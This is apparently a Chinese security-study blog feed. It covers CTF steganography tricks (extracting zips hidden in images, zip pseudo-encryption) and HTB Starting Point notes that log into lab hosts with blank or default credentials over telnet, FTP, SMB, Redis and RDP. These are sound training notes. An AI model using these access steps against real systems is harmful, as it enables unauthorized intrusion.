<h4 id="2-1、binwalk-分离："><a href="#2-1、binwalk-分离：" class="headerlink" title="2.1、binwalk 分离："></a>2.1、binwalk 分离：</h4><p>还是使用binwalk工具，使用dd命令分离出隐藏文件：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">dd <span class="attribute">if</span>=1.jpg <span class="attribute">of</span>=1.zip <span class="attribute">skip</span>=48221 <span class="attribute">bs</span>=1</span><br></pre></td></tr></table></figure>

<p>解释：if 指定输入文件，of 指定输出文件，skip 指定从输入文件开头跳过48221个块后开始复制，</p>
<p>bs设置每次读写块的大小为1字节</p>
<p>执行后会得到一个1.zip文件。</p>
<p><a data-fancybox="gallery" data-src="/crypto+misc/image-20220927165740304.png"><img src="/crypto+misc/image-20220927165740304.png" alt="image-20220927165740304"></a></p>
<h4 id="2-2、foremost-工具分离："><a href="#2-2、foremost-工具分离：" class="headerlink" title="2.2、foremost 工具分离："></a>2.2、foremost 工具分离：</h4><p>foremost是一个基于文件文件头和尾部信息以及文件的内建数据结构恢复文件的命令行工具，win可以下载使用，Linux可以通过下面命令安装使用：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">apt-<span class="built_in">get</span> install foremost</span><br></pre></td></tr></table></figure>


<p>Linux下分离文件的命令为：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">foremost</span> <span class="number">1</span>.jpg</span><br></pre></td></tr></table></figure>


<p>执行命令后，foremost会生成output目录存放分离出的文件。</p>
<p>Win下是把文件直接拖到 foremost.exe上，也会生成output目录存放分离出的文件。</p>
<p><a data-fancybox="gallery" data-src="/crypto+misc/image-20220927165802749.png"><img src="/crypto+misc/image-20220927165802749.png" alt="image-20220927165802749"></a></p>
<h4 id="2-3、hex编辑器分离："><a href="#2-3、hex编辑器分离：" class="headerlink" title="2.3、hex编辑器分离："></a>2.3、hex编辑器分离：</h4><p>hex编辑器有很多，win下有用得较多的winhex、UltraEdit等，linux下有hexeditor等。这里我们以winhex为例来手动分离。</p>
<p>一个完整的 jpg 文件由 FF D8 开头，FF D9结尾，图片查看器会忽略 FF D9 以后的内容，因此可以在 jpg 文件中加入其他文件。</p>
<p>经过上面的分析， 知道图片中隐藏了zip文件，zip文件的开头16进制为504B0304，先搜索16进制文本 FFD9，然后后面跟着504B0304，于是就可以从 50 开始，复制到最后（因为这里只有一个zip，所以复制到最后），另存为新文件，就得到了隐藏的压缩包。</p>
<p><a data-fancybox="gallery" data-src="/crypto+misc/image-20220927165829838.png"><img src="/crypto+misc/image-20220927165829838.png" alt="image-20220927165829838"></a></p>
<p><a data-fancybox="gallery" data-src="/crypto+misc/image-20220927165845340.png"><img src="/crypto+misc/image-20220927165845340.png" alt="image-20220927165845340"></a></p>
<p><a data-fancybox="gallery" data-src="/crypto+misc/image-20220927165911140.png"><img src="/crypto+misc/image-20220927165911140.png" alt="image-20220927165911140"></a></p>
<h4 id="2-4、改后缀名："><a href="#2-4、改后缀名：" class="headerlink" title="2.4、改后缀名："></a>2.4、改后缀名：</h4><p>分析知道隐藏文件是zip后，有一个简单粗暴的方法是直接把图片的后缀改为.zip，然后解压即可（这种方法虽然简单快速，但如果隐写了多个文件时可能会失败）。</p>
<h2 id="11-多图片拼图"><a href="#11-多图片拼图" class="headerlink" title="11.多图片拼图"></a>11.多图片拼图</h2><p><a href="https://blog.csdn.net/m0_62291930/article/details/124139016">原文链接</a></p>
<p>Misc 自动拼图<br>需要使用<code>python</code>遗传算法脚本<code>gaps</code>和拼图脚本<code>montage</code></p>
<p>开始拼图<br>以ctf中的一道训练题puzzle为例</p>
<p>如果图片为碎片状，根据总数确定拼块长宽数量，并用montage进行第一次拼接</p>
<p><a data-fancybox="gallery" data-src="/crypto+misc/image-20220927171241532.png"><img src="/crypto+misc/image-20220927171241532.png" alt="image-20220927171241532"></a></p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#如左下角所示，总数为256块，即图片以16×16拆分而成的（要在拼块目录下运行命令），</span></span><br><span class="line"><span class="meta">#*.png为拼块格式，16×16为长宽数量，flag.png为合成后的图片名</span></span><br></pre></td></tr></table></figure>

<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">montage</span> *.png -tile <span class="number">16</span>x16 -geometry +<span class="number">0</span>+<span class="number">0</span> flag.png   </span><br></pre></td></tr></table></figure>



<p>运行后在目录下可找到如下图片</p>
<p><a data-fancybox="gallery" data-src="/crypto+misc/image-20220927171709538.png"><img src="/crypto+misc/image-20220927171709538.png" alt="image-20220927171709538"></a></p>
<p>运行后在目录下可找到如下图片</p>
<p><strong>接着最关键的一点，调整图片长宽比为1：1，可以用PS-&gt;图像大小，以较大数值为边长，扩充为正方形（方便后续size的计算），否则后期gaps无法获得最佳效果</strong></p>
<p><a data-fancybox="gallery" data-src="/crypto+misc/image-20220927171907186.png"><img src="/crypto+misc/image-20220927171907186.png" alt="image-20220927171907186"></a></p>
<p><a data-fancybox="gallery" data-src="/crypto+misc/image-20220927171924733.png"><img src="/crypto+misc/image-20220927171924733.png" alt="image-20220927171924733"></a></p>
<p>接下来就是调用gaps脚本实现自动拼图排序<strong>（重点）</strong></p>
<p><a data-fancybox="gallery" data-src="/crypto+misc/image-20220927171940838.png"><img src="/crypto+misc/image-20220927171940838.png" alt="image-20220927171940838"></a></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment">#此处的size为正方形小拼块的边长像素，由于刚刚经过拉伸，拼块从160×100变成了160×160</span></span><br><span class="line"><span class="comment">#注意是小的正方形像素，比如拼接完成的为360px，而一列有12张图，那size为12px</span></span><br><span class="line">gaps <span class="attribute">--image</span>=flag.png <span class="attribute">--size</span>=160 --save     </span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/crypto+misc/image-20220927171957840.png"><img src="/crypto+misc/image-20220927171957840.png" alt="image-20220927171957840"></a></p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">补充：gaps各参数的作用</span><br><span class="line"></span><br><span class="line">–<span class="built_in">image</span> 指向拼图的路径</span><br><span class="line">–size 拼图块的像素尺寸</span><br><span class="line">–generations 遗传算法的代的数量</span><br><span class="line">–population 个体数量</span><br><span class="line">–<span class="built_in">verbose</span> 每一代训练结束后展示最佳结果</span><br><span class="line">–<span class="built_in">save</span> 将拼图还原为图像</span><br></pre></td></tr></table></figure>



<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">总结</span><br><span class="line">最有挑战性的地方莫过于安装gaps和对gaps参数的把握，特别是sized的计算,需要先使图片的拼块恰好为像素最大的一条边的正方形，<span class="keyword">size</span>=该边长像素。另外，pip和<span class="keyword">python</span>库要提前安装完毕</span><br></pre></td></tr></table></figure>

<h2 id="12-zip伪加密【360压缩无视伪加密】"><a href="#12-zip伪加密【360压缩无视伪加密】" class="headerlink" title="12.zip伪加密【360压缩无视伪加密】"></a>12.zip伪加密【360压缩无视伪加密】</h2><h3 id="1-zip-文件"><a href="#1-zip-文件" class="headerlink" title="1)zip 文件"></a>1)zip 文件</h3><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">一个 <span class="keyword">ZIP</span> 文件由三个部分组成：</span><br><span class="line"></span><br><span class="line">压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志</span><br></pre></td></tr></table></figure>



<h3 id="2-伪加密原理"><a href="#2-伪加密原理" class="headerlink" title="2)伪加密原理"></a>2)伪加密原理</h3><figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line">zip伪加密是在文件头的加密标志位做修改，进而再打开文件时识被别为加密压缩包。</span><br><span class="line"></span><br><span class="line">把 压缩源文件目录区 的 全局方式位标记  的 `01 <span class="number">00</span>` 或 `09 <span class="number">00</span>` 改为 `00 <span class="number">00</span>`  就可以去除密码</span><br><span class="line"></span><br><span class="line">把 压缩源文件目录区 的 全局方式位标记  的 `00 <span class="number">00</span>` 改为  `01 <span class="number">00</span>` 或 `09 <span class="number">00</span>`  就可以添加密码 提示</span><br></pre></td></tr></table></figure>



<h3 id="3-压缩源文件数据区"><a href="#3-压缩源文件数据区" class="headerlink" title="3)压缩源文件数据区"></a>3)压缩源文件数据区</h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">50</span> <span class="number">4</span>B <span class="number">03</span> <span class="number">04</span>：这是头文件标记（<span class="number">0</span>x04034b50） </span><br><span class="line"><span class="attribute">14</span> <span class="number">00</span>：解压文件所需 pkware 版本 </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span>：全局方式位标记（有无加密） </span><br><span class="line"><span class="attribute">08</span> <span class="number">00</span>：压缩方式 </span><br><span class="line"><span class="attribute">5A</span> <span class="number">7</span>E：最后修改文件时间 </span><br><span class="line"><span class="attribute">F7</span> <span class="number">46</span>：最后修改文件日期 </span><br><span class="line"><span class="attribute">16</span> B5 <span class="number">80</span> <span class="number">14</span>：CRC-<span class="number">32</span>校验（<span class="number">1480</span>B516） </span><br><span class="line"><span class="attribute">19</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>：压缩后尺寸（<span class="number">25</span>） </span><br><span class="line"><span class="attribute">17</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>：未压缩尺寸（<span class="number">23</span>） </span><br><span class="line"><span class="attribute">07</span> <span class="number">00</span>：文件名长度 </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span>：扩展记录长度 </span><br></pre></td></tr></table></figure>



<h3 id="4-压缩源文件目录区："><a href="#4-压缩源文件目录区：" class="headerlink" title="4)压缩源文件目录区："></a>4)压缩源文件目录区：</h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">50</span> <span class="number">4</span>B <span class="number">01</span> <span class="number">02</span>：目录中文件文件头标记(<span class="number">0</span>x02014b50) </span><br><span class="line"><span class="attribute">3F</span> <span class="number">00</span>：压缩使用的 pkware 版本 </span><br><span class="line"><span class="attribute">14</span> <span class="number">00</span>：解压文件所需 pkware 版本 </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span>：全局方式位标记（有无加密，这个更改这里进行伪加密，改为<span class="number">09</span> <span class="number">00</span>打开就会提示有密码了） </span><br><span class="line"><span class="attribute">08</span> <span class="number">00</span>：压缩方式 </span><br><span class="line"><span class="attribute">5A</span> <span class="number">7</span>E：最后修改文件时间 </span><br><span class="line"><span class="attribute">F7</span> <span class="number">46</span>：最后修改文件日期 </span><br><span class="line"><span class="attribute">16</span> B5 <span class="number">80</span> <span class="number">14</span>：CRC-<span class="number">32</span>校验（<span class="number">1480</span>B516） </span><br><span class="line"><span class="attribute">19</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>：压缩后尺寸（<span class="number">25</span>） </span><br><span class="line"><span class="attribute">17</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>：未压缩尺寸（<span class="number">23</span>） </span><br><span class="line"><span class="attribute">07</span> <span class="number">00</span>：文件名长度 </span><br><span class="line"><span class="attribute">24</span> <span class="number">00</span>：扩展字段长度 </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span>：文件注释长度 </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span>：磁盘开始号 </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span>：内部文件属性 </span><br><span class="line"><span class="attribute">20</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>：外部文件属性 </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>：局部头部偏移量 </span><br><span class="line"><span class="attribute">6B65792E7478740A00200000000000010018006558F04A1CC5D001BDEBDD3B1CC5D001BDEBDD3B1CC5D001</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="5-压缩源文件目录结束标志："><a href="#5-压缩源文件目录结束标志：" class="headerlink" title="5)压缩源文件目录结束标志："></a>5)压缩源文件目录结束标志：</h3><figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">50 </span><span class="number">4</span>B <span class="number">05</span> <span class="number">06</span>：目录结束标记 </span><br><span class="line"><span class="symbol">00 </span><span class="number">00</span>：当前磁盘编号 </span><br><span class="line"><span class="symbol">00 </span><span class="number">00</span>：目录区开始磁盘编号 </span><br><span class="line"><span class="symbol">01 </span><span class="number">00</span>：本磁盘上纪录总数 </span><br><span class="line"><span class="symbol">01 </span><span class="number">00</span>：目录区中纪录总数 </span><br><span class="line"><span class="symbol">59 </span><span class="number">00</span> <span class="number">00</span> <span class="number">00</span>：目录区尺寸大小 </span><br><span class="line"><span class="number">3</span>E <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>：目录区对第一张磁盘的偏移量 </span><br><span class="line"><span class="symbol">00 </span><span class="number">00</span>：ZIP 文件注释长度</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="6-查找压缩文件目录区"><a href="#6-查找压缩文件目录区" class="headerlink" title="6)查找压缩文件目录区"></a>6)查找压缩文件目录区</h3><figure class="highlight tap"><table><tr><td class="code"><pre><span class="line">一般面对一些小的文件时 很容易就找到  压缩文件目录区 的文件头</span><br><span class="line"></span><br><span class="line">但是当我们面对一些较大的文件 找 压缩文件目录区的 文件头 <span class="number"> 50 </span>4B<span class="number"> 01 </span>02 就有点麻烦了</span><br><span class="line"></span><br><span class="line">我们可以利用 winhex 中的查找 字符查找 快速找到  压缩文件目录区  的文件头</span><br><span class="line"></span><br><span class="line">然后把 后面的 全方位标记区 的<span class="number"> 01 </span>00 或<span class="number"> 09 </span>00  改为<span class="number"> 00 </span>00 保存 后就可以打开压缩包了</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
      <tags>
        <tag>crypto&amp;misc</tag>
      </tags>
  </entry>
  <entry>
    <title>htbのSTARTING POINT</title>
    <url>/htb(STARTING-POINT)/</url>
    <content><![CDATA[<p><strong><code>想准备试试OSCP，HACK THE BOX还行，学习一些实战知识，以及一些概念了解，部分机器根据协议，我会总结知识点，不会给出全部</code></strong></p>
<span id="more"></span>

<h1 id="STARTING-POINT"><a href="#STARTING-POINT" class="headerlink" title="STARTING POINT"></a>STARTING POINT</h1><h1 id="第0层"><a href="#第0层" class="headerlink" title="第0层"></a>第0层</h1><h2 id="Meow"><a href="#Meow" class="headerlink" title="*Meow"></a>*Meow</h2><h3 id="Tags"><a href="#Tags" class="headerlink" title="Tags"></a>Tags</h3><blockquote>
<p><code>telnet</code></p>
<p><code>渗透测试仪 1 级</code></p>
<p><code>网络</code></p>
<p><code>协议</code></p>
<p><code>侦察</code></p>
<p><code>弱凭证</code></p>
<p><code>配置错误</code></p>
</blockquote>
<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><blockquote>
<ol>
<li>VPN 启动序列输出中“隧道接口”的缩写名称：<code>tun</code></li>
<li>我们使用什么工具通过 ICMP 回显请求测试我们与目标的连接：<code>ping</code>【ping不走代理】</li>
<li>用于在目标上查找开放端口的最常用工具的名称是什么？：<code>nmap</code></li>
<li>我们在扫描期间在端口 23&#x2F;tcp 上识别出什么服务？:<code>telnet</code>【远程登录】</li>
<li>什么用户名能够使用空白密码通过 telnet 登录目标？: <code>root</code></li>
</ol>
</blockquote>
<h4 id="telnet和ssh的区别"><a href="#telnet和ssh的区别" class="headerlink" title="telnet和ssh的区别"></a>telnet和ssh的区别</h4><blockquote>
<p>加密方式不同：**<code>telnet</code>是明码传输<strong>，</strong><code>SSH</code>是加密传输**。 <code>telnet</code>通过<code>TCP/IP</code>协议簇来访问远程终端，<code>传输的数据和口令是明文形式</code>。 相对来说不安全，你所有的数据都可被攻击者直接捕获。 <strong>SSH相对于telnet安全</strong>，它的<code>传输方式是以加密形式传输</code></p>
</blockquote>
<h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">telnet</span><span class="meta"> [target_ip]</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/htb(STARTING-POINT)/image-20230127011324556.png"><img src="/htb(STARTING-POINT)/image-20230127011324556.png" alt="image-20230127011324556"></a></p>
<h2 id="Fawn"><a href="#Fawn" class="headerlink" title="*Fawn"></a>*Fawn</h2><h3 id="Tags-1"><a href="#Tags-1" class="headerlink" title="Tags"></a>Tags</h3><blockquote>
<p><code>渗透测试仪 1 级</code></p>
<p><code>ftp</code></p>
<p><code>网络</code></p>
<p><code>协议</code></p>
<p><code>侦察</code></p>
<p><code>匿名/访客访问</code></p>
</blockquote>
<h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><blockquote>
<ol>
<li><p>3 个字母的首字母缩略词 FTP 代表什么？: <code>File Transfer Protocol</code>(文件传输协议)</p>
</li>
<li><p>FTP服务通常监听哪个端口？: <code>21</code></p>
</li>
<li><p>FTP 的安全版本使用什么首字母缩写词？: <code>SFTP</code></p>
</li>
<li><p>当您想在没有帐户的情况下登录时，通过 <code>FTP</code> 使用的用户名是什么？: <code>anonymous</code></p>
</li>
<li><p>我们得到的 FTP 消息“登录成功”的响应代码是什么？:<code>230</code></p>
<p><a data-fancybox="gallery" data-src="/htb(STARTING-POINT)/image-20230127001710275.png"><img src="/htb(STARTING-POINT)/image-20230127001710275.png" alt="image-20230127001710275"></a></p>
</li>
<li><p>用于下载我们在 FTP 服务器上找到的文件的命令是什么？:<code>get</code></p>
</li>
</ol>
</blockquote>
<h4 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h4><blockquote>
<p>文件传输协议（File Transfer Protocol，FTP）是用于在<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C?fromModule=lemma_inlink">网络</a>上进行文件传输的一套标准协议，它工作在 OSI 模型的第七层， TCP 模型的第四层， 即应用层， 使用 TCP 传输而不是 UDP， 客户在和服务器建立连接前要经过一个“三次握手”的过程， 保证客户与服务器之间的连接是可靠的， 而且是面向连接， 为数据传输提供可靠保证。</p>
</blockquote>
<h4 id="SFTP"><a href="#SFTP" class="headerlink" title="SFTP"></a>SFTP</h4><blockquote>
<p><code>sftp</code>是Secure File Transfer Protocol的缩写，安全文件传送协议。可以为传输文件提供一种安全的网络的加密方法。sftp 与 ftp 有着几乎一样的语法和功能。<code>SFTP 为 SSH的其中一部分</code>，是一种传输档案至 Blogger 伺服器的安全方式。其实在<code>SSH软件包</code>中，已经包含了一个叫作<code>SFTP(Secure File Transfer Protocol)的安全文件信息传输子系统</code>，SFTP<code>本身没有单独的守护进程</code>，它<code>必须使用sshd守护进程（端口号默认是22）</code>来完成相应的连接和答复操作，所以从某种意义上来说，SFTP并不像一个服务器程序，而更像是一个客户端程序。</p>
<p>SFTP同样是使用加密传输认证信息和传输的数据，所以，使用SFTP是非常安全的。但是，由于这种传输方式使用了加密&#x2F;解密技术，所以<code>传输效率比普通的FTP要低得多</code>，如果您对网络安全性要求更高时，可以使用SFTP代替FTP。</p>
</blockquote>
<h3 id="过程-1"><a href="#过程-1" class="headerlink" title="过程"></a>过程</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">ftp <span class="selector-attr">[USER@]</span>HOST <span class="selector-attr">[PORT]</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/htb(STARTING-POINT)/image-20230127011036214.png"><img src="/htb(STARTING-POINT)/image-20230127011036214.png" alt="image-20230127011036214"></a></p>
<h2 id="Dancing"><a href="#Dancing" class="headerlink" title="*Dancing"></a>*Dancing</h2><h3 id="Tags-2"><a href="#Tags-2" class="headerlink" title="Tags"></a>Tags</h3><blockquote>
<p><code>网络</code></p>
<p><code>协议</code></p>
<p><code>SMB</code></p>
<p><code>渗透测试仪 1 级</code></p>
<p><code>侦察</code></p>
<p><code>匿名/访客访问</code></p>
</blockquote>
<h3 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h3><blockquote>
<ol>
<li>3 个字母的首字母缩略词 SMB 代表什么？:<code>Server Message Block</code>(服务器消息块)</li>
<li>SMB 使用哪个端口进行操作？: <code>445</code></li>
<li>我们可以使用 SMB 工具来“列出”共享内容的“标志”或“开关”是什么？: <code>-L</code></li>
<li>我们最终能够使用空白密码访问的共享名称是什么？: <code>WorkShares</code></li>
<li>我们可以在 SMB shell 中使用什么命令来下载我们找到的文件？: <code>get</code></li>
</ol>
</blockquote>
<h4 id="什么是SMB"><a href="#什么是SMB" class="headerlink" title="什么是SMB"></a>什么是SMB</h4><blockquote>
<p><code>SMB</code>是客户端与服务器的交互协议，客户端在其中请求文件，然后服务器将文件提供给客户端。</p>
<p>现在，它是一个基于Windows的网络，使用户可以创建，修改和删除网络中的共享文件，文件夹，打印机。SMB是使用TCP端口445进行通信的应用程序分层协议。</p>
<p>它还提供了一种草根化的互通机制，可以在客户端和服务器之间进行传输以共享文件。随着其版本的升级，服务将得到更大的增强，并可以被用户或客户端有效使用。</p>
</blockquote>
<h4 id="SMB如何运作"><a href="#SMB如何运作" class="headerlink" title="SMB如何运作"></a>SMB如何运作</h4><blockquote>
<p><code>SMB</code>是一种请求-响应协议，这意味着它在客户端和服务器之间传输多条消息以完成请求。</p>
</blockquote>
<h4 id="FTP-SMB-NFS的区别"><a href="#FTP-SMB-NFS的区别" class="headerlink" title="FTP, SMB, NFS的区别"></a>FTP, SMB, NFS的区别</h4><p><a data-fancybox="gallery" data-src="/htb(STARTING-POINT)/image-20230127003921531.png"><img src="/htb(STARTING-POINT)/image-20230127003921531.png" alt="image-20230127003921531"></a></p>
<blockquote>
<p><code>NFS</code> 最好，速度快点，配置复杂点<br><code>FTP</code> 最通用，最简单<br><code>SMB</code> 不太稳定，有时候Win 会提示找不到地址</p>
</blockquote>
<h3 id="过程-2"><a href="#过程-2" class="headerlink" title="过程"></a>过程</h3><blockquote>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"> <span class="attribute">smbclient</span> -L<span class="meta"> [target_ip]</span></span><br><span class="line"><span class="comment">#列出所有可用共享</span></span><br></pre></td></tr></table></figure>

</blockquote>
<p><a data-fancybox="gallery" data-src="/htb(STARTING-POINT)/image-20230127010237573.png"><img src="/htb(STARTING-POINT)/image-20230127010237573.png" alt="image-20230127010237573"></a></p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">smbclient <span class="symbol">\\</span><span class="symbol">\\</span>[target_ip]<span class="symbol">\\</span>WorkShares</span><br><span class="line">#连接到 WorkShares</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/htb(STARTING-POINT)/image-20230127010626438.png"><img src="/htb(STARTING-POINT)/image-20230127010626438.png" alt="image-20230127010626438"></a></p>
<h2 id="Redeemer"><a href="#Redeemer" class="headerlink" title="Redeemer"></a>Redeemer</h2><h3 id="Tags-3"><a href="#Tags-3" class="headerlink" title="Tags"></a>Tags</h3><blockquote>
<p><code>Redis</code></p>
<p><code>渗透测试仪 1 级</code></p>
<p><code>漏洞评估</code></p>
<p><code>数据库</code></p>
<p><code>侦察</code></p>
<p><code>匿名/访客访问</code></p>
</blockquote>
<h3 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h3><blockquote>
<ol>
<li>Redis 是什么类型的数据库？:<code>In-memory Database</code>(内存数据库)</li>
<li>哪个命令行实用程序用于与 Redis 服务器交互？输入您要在终端中输入的程序名称，不带任何参数。: <code>redis-cli</code></li>
<li>Redis 命令行实用程序使用哪个标志来指定主机名？: <code>-h</code></li>
<li>连接到Redis服务器后，使用哪个命令获取有关Redis服务器的信息和统计信息？: <code>info</code></li>
<li>在 Redis 中使用哪个命令来选择所需的数据库？:  <code>select</code></li>
<li>哪个命令用于获取数据库中的所有键？： <code>keys *</code></li>
<li>哪个命令用于读取键值?：<code>get</code></li>
</ol>
</blockquote>
<h4 id="什么是Redis"><a href="#什么是Redis" class="headerlink" title="什么是Redis"></a>什么是Redis</h4><blockquote>
<p><strong>Redis</strong> (REmote DIctionary Server) 是一种开源的高级 <code>NoSQL</code> <strong>键值数据存储</strong>，用作数据库、缓存和消息代理。</p>
<p>数据以具有键值对的字典格式存储。数据库存储在<code>服务器的 RAM（内存中）</code>中以实现快速数据访问。Redis 还会以不同的时间间隔将数据库的内容写入磁盘，以在<code>发生故障时将其作为备份持久保存</code>。</p>
<p>Redis 是一个开源的使用 ANSI C 语言编写、遵守 BSD 协议、支持网络、可基于内存、分布式、可选持久性的键值对(Key-Value)存储数据库，并提供多种语言的 API。</p>
<p>Redis 通常被称为数据结构服务器，因为值（value）可以是字符串(String)、哈希(Hash)、列表(list)、集合(sets)和有序集合(sorted sets)等类型。</p>
</blockquote>
<h4 id="什么是NoSQL"><a href="#什么是NoSQL" class="headerlink" title="什么是NoSQL"></a>什么是NoSQL</h4><blockquote>
<p>NoSQL，泛指非关系型的数据库。</p>
<p>随着互联网<a href="https://baike.baidu.com/item/web2.0/97695">web2.0</a>网站的兴起，传统的关系数据库在处理web2.0网站，特别是超大规模和高并发的<a href="https://baike.baidu.com/item/SNS/10242">SNS</a>类型的web2.0纯<a href="https://baike.baidu.com/item/%E5%8A%A8%E6%80%81%E7%BD%91">动态网</a>站已经显得力不从心，出现了很多难以克服的问题，而非关系型的数据库则由于其本身的特点得到了非常迅速的发展。</p>
<p>NoSQL数据库的产生就是为了解决大规模数据集合多重数据种类带来的挑战，特别是大数据应用难题。</p>
</blockquote>
<h3 id="过程-3"><a href="#过程-3" class="headerlink" title="过程"></a>过程</h3><figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line">redis-<span class="keyword">cli</span> -h target_ip</span><br><span class="line"><span class="meta">#连接到 redis 服务器</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/htb(STARTING-POINT)/image-20230127145928047.png"><img src="/htb(STARTING-POINT)/image-20230127145928047.png" alt="image-20230127145928047"></a></p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="built_in">keys</span> * </span><br><span class="line"><span class="comment">#获取数据库中的所有键</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/htb(STARTING-POINT)/image-20230127145944398.png"><img src="/htb(STARTING-POINT)/image-20230127145944398.png" alt="image-20230127145944398"></a></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="built_in">get</span> flag</span><br><span class="line"><span class="comment">#获取flag键值</span></span><br></pre></td></tr></table></figure>

<p>【动态flag，不能展示.png】</p>
<h2 id="·Explosion"><a href="#·Explosion" class="headerlink" title="·Explosion"></a>·Explosion</h2><h3 id="Tags-4"><a href="#Tags-4" class="headerlink" title="Tags"></a>Tags</h3><blockquote>
<p><code>网络</code></p>
<p><code>编程</code></p>
<p><code>RDP</code></p>
<p><code>渗透测试仪 1 级</code></p>
<p><code>侦察</code></p>
<p><code>弱凭证</code></p>
</blockquote>
<h3 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h3><blockquote>
<ol>
<li>3 个字母的首字母缩略词 RDP 代表什么？：<code>Remote Desktop Protocol</code>（远程桌面协议）</li>
<li>表示通过命令行界面与主机交互的三个字母的首字母缩写词是什么？：<code>CLI</code></li>
<li>那么图形用户界面交互呢？：<code>GUI</code></li>
<li>默认情况下未加密的旧远程访问工具的名称是什么？：<code>telnet</code></li>
<li>在 TCP 3389 端口上运行的服务的名称是什么？<code>ms-wbt-server</code>(RDP服务，默认端口3389)</li>
<li>使用 xfreerdp 时用于指定目标主机 IP 地址的开关是什么？：<code>/v:</code>(打开工具即可查看)</li>
<li>什么用户名使用空白密码成功返回桌面投影给我们？： <code>administrator</code>（windows用户的最高权限）</li>
</ol>
</blockquote>
<h4 id="什么是RDP"><a href="#什么是RDP" class="headerlink" title="什么是RDP"></a>什么是RDP</h4><blockquote>
<p><strong>远程桌面</strong>协议 ( <strong>RDP</strong> ) 是 Microsoft 开发的专有协议，它<code>为用户提供图形界面以通过网络连接到另一台计算机</code>。用户为此目的使用<strong>RDP客户端软件，而另一台计算机必须运行</strong> <strong>RDP</strong>服务器软件</p>
</blockquote>
<h4 id="什么是freerdp"><a href="#什么是freerdp" class="headerlink" title="什么是freerdp"></a>什么是freerdp</h4><blockquote>
<p>FreeRDP是一个Remote Desktop Protocol（协议）的一个实现，遵循Apache开源协议，<code>支持3D功能，并有较高刷新率，也支持RemoteFX，H264编解码，用户管理，音频以及外设重定向</code>等功能。</p>
</blockquote>
<h3 id="过程-4"><a href="#过程-4" class="headerlink" title="过程"></a>过程</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xfreerdp /v:10.129.31.107 /u:administrator</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/htb(STARTING-POINT)/image-20230127174214417.png"><img src="/htb(STARTING-POINT)/image-20230127174214417.png" alt="image-20230127174214417"></a></p>
<h2 id="Preignition"><a href="#Preignition" class="headerlink" title="Preignition"></a>Preignition</h2><h3 id="Tags-5"><a href="#Tags-5" class="headerlink" title="Tags"></a>Tags</h3><blockquote>
<p><code>网络</code></p>
<p><code>传统应用</code></p>
<p><code>Apache</code></p>
<p><code>渗透测试仪 1 级</code></p>
<p><code>侦察</code></p>
<p><code>网站结构发现</code></p>
<p><code>默认凭证</code></p>
</blockquote>
<h3 id="知识点-5"><a href="#知识点-5" class="headerlink" title="知识点"></a>知识点</h3><blockquote>
<ol>
<li><p>目录暴力破解是一种用于检查 Web 服务器上的许多路径以查找隐藏页面的技术。另叫做？:<code>dir busting</code></p>
</li>
<li><p>nmap的扫描用什么switch来指定我们要进行版本检测：<code>-sV</code></p>
</li>
<li><p>我们使用什么开关来指定我们要专门执行 dir busting 的 Gobuster？：<code>dir</code></p>
</li>
